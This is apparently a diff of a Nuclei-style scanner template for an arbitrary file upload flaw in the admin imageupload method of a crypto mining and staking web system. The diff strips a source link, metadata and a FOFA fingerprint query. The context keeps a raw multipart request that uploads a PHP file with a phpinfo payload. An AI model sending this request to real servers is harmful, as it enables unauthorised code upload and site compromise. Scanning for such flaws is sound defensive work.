@@ -3,12 +3,8 @@ info:
   name: 某U挖矿质押单语言系统imageupload后台任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sw8bladfous9t2t7'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sw8bladfous9t2t7
-    fofa: '"/static/index/css/login/framework7.ios.min.css"'
 http:
 - raw:
   - '位于 /admin/controller/News.php 控制器的 imageupload 方法存在一个很明显的上传文件操作file()，且无任何限制，导致漏洞产生
@@ -56,9 +52,7 @@ http:
 
     <?php phpinfo();?>
 
-    ------WebKitFormBoundary03rNBzFMIytvpWhy--
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1725844547489-ed4b61e1-8d80-45c1-bf04-6e858d494e71.png)'
+    ------WebKitFormBoundary03rNBzFMIytvpWhy--'
   redirects: false
   matchers:
   - status:
